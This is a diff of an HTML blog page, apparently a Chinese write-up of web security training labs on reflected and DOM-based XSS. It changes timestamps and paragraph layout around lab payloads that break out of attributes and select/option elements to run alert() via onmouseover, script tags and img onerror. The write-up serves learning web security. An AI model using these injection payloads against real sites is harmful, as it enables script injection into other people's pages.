@@ -155,7 +155,7 @@
 <meta property="og:image" content="https://by-musi.github.io/images/2024/02/20/a.png">
 <meta property="og:image" content="https://by-musi.github.io/images/2024/02/20/Pasted_image_20240205134534.png">
 <meta property="article:published_time" content="2024-02-19T16:00:00.000Z">
-<meta property="article:modified_time" content="2024-02-20T14:02:36.592Z">
+<meta property="article:modified_time" content="2024-02-20T14:04:54.401Z">
 <meta property="article:author" content="CaiShao">
 <meta property="article:tag" content="web">
 <meta property="article:tag" content="xss">
@@ -328,13 +328,15 @@
 <p><a data-fancybox="gallery" data-src="/images/2024/02/20/Pasted_image_20231123135946.png" data-caption=""><img src="/images/2024/02/20/Pasted_image_20231123135946.png"></a></p>
 <p>payload2 <strong>闭合属性</strong>完成 XSS: <code>&quot; onmouseover=alert(/xss/)&quot;</code></p>
 <p><a data-fancybox="gallery" data-src="/images/2024/02/20/Pasted_image_20231128214457.png" data-caption=""><img src="/images/2024/02/20/Pasted_image_20231128214457.png"></a><br>img 就一个像素，难以触发 emmm</p>
-<p>重新构造 payload <code>&quot; style=&quot;width:30px;height:30px;background-color:red;&quot; onmouseover=alert(/xss/) &quot;</code><br><a data-fancybox="gallery" data-src="/images/2024/02/20/Pasted_image_20231128214215.png" data-caption=""><img src="/images/2024/02/20/Pasted_image_20231128214215.png"></a></p>
+<p>重新构造 payload <code>&quot; style=&quot;width:30px;height:30px;background-color:red;&quot; onmouseover=alert(/xss/) &quot;</code></p>
+<p><a data-fancybox="gallery" data-src="/images/2024/02/20/Pasted_image_20231128214215.png" data-caption=""><img src="/images/2024/02/20/Pasted_image_20231128214215.png"></a></p>
 <p>鼠标移动到 img 区域，触发 xss。</p>
 <p><a data-fancybox="gallery" data-src="/images/2024/02/20/Pasted_image_20231128214304.png" data-caption=""><img src="/images/2024/02/20/Pasted_image_20231128214304.png"></a></p>
 <h1 id="4-Lab-DOM-XSS-in-document-write-sink-using-source-location-search-inside-a-select-element"><a href="#4-Lab-DOM-XSS-in-document-write-sink-using-source-location-search-inside-a-select-element" class="headerlink" title="4 Lab: DOM XSS in document.write sink using source location.search inside a select element"></a>4 Lab: DOM XSS in <code>document.write</code> sink using source <code>location.search</code> inside a select element</h1><p><a data-fancybox="gallery" data-src="/images/2024/02/20/Pasted_image_20231123142021.png" data-caption=""><img src="/images/2024/02/20/Pasted_image_20231123142021.png"></a><br><a data-fancybox="gallery" data-src="/images/2024/02/20/Pasted_image_20231123142007.png" data-caption=""><img src="/images/2024/02/20/Pasted_image_20231123142007.png"></a><br><a data-fancybox="gallery" data-src="/images/2024/02/20/Pasted_image_20231123142209.png" data-caption=""><img src="/images/2024/02/20/Pasted_image_20231123142209.png"></a><br><a data-fancybox="gallery" data-src="/images/2024/02/20/Pasted_image_20231123142335.png" data-caption=""><img src="/images/2024/02/20/Pasted_image_20231123142335.png"></a></p>
 <p>虽然表单使用的是 POST 方法传参，但是根据 js 代码，<code>storeId</code> 是通过 <code>window.location.search</code> 从url 中获取的。（md，用 burp 抓包弄了半天，人傻了）</p>
 <p>请求 url : <code>product?productId=5&amp;storeId=1235134481234</code> </p>
-<p><a data-fancybox="gallery" data-src="/images/2024/02/20/Pasted_image_20231123153437.png" data-caption=""><img src="/images/2024/02/20/Pasted_image_20231123153437.png"></a><br>payload1: <code>product?productId=5&amp;storeId=1235134481234&lt;/option&gt;&lt;script&gt;alert(/xss/)&lt;/script&gt;</code></p>
+<p><a data-fancybox="gallery" data-src="/images/2024/02/20/Pasted_image_20231123153437.png" data-caption=""><img src="/images/2024/02/20/Pasted_image_20231123153437.png"></a></p>
+<p>payload1: <code>product?productId=5&amp;storeId=1235134481234&lt;/option&gt;&lt;script&gt;alert(/xss/)&lt;/script&gt;</code></p>
 <p><a data-fancybox="gallery" data-src="/images/2024/02/20/Pasted_image_20231123153659.png" data-caption=""><img src="/images/2024/02/20/Pasted_image_20231123153659.png"></a></p>
 <p>payload2: <code>product?productId=5&amp;storeId=&lt;/select&gt;&lt;img%20src=1%20onerror=alert(/xss/)&gt;</code></p>
 <p><a data-fancybox="gallery" data-src="/images/2024/02/20/Pasted_image_20231123154043.png" data-caption=""><img src="/images/2024/02/20/Pasted_image_20231123154043.png"></a><br><a data-fancybox="gallery" data-src="/images/2024/02/20/Pasted_image_20231123154112.png" data-caption=""><img src="/images/2024/02/20/Pasted_image_20231123154112.png"></a></p>
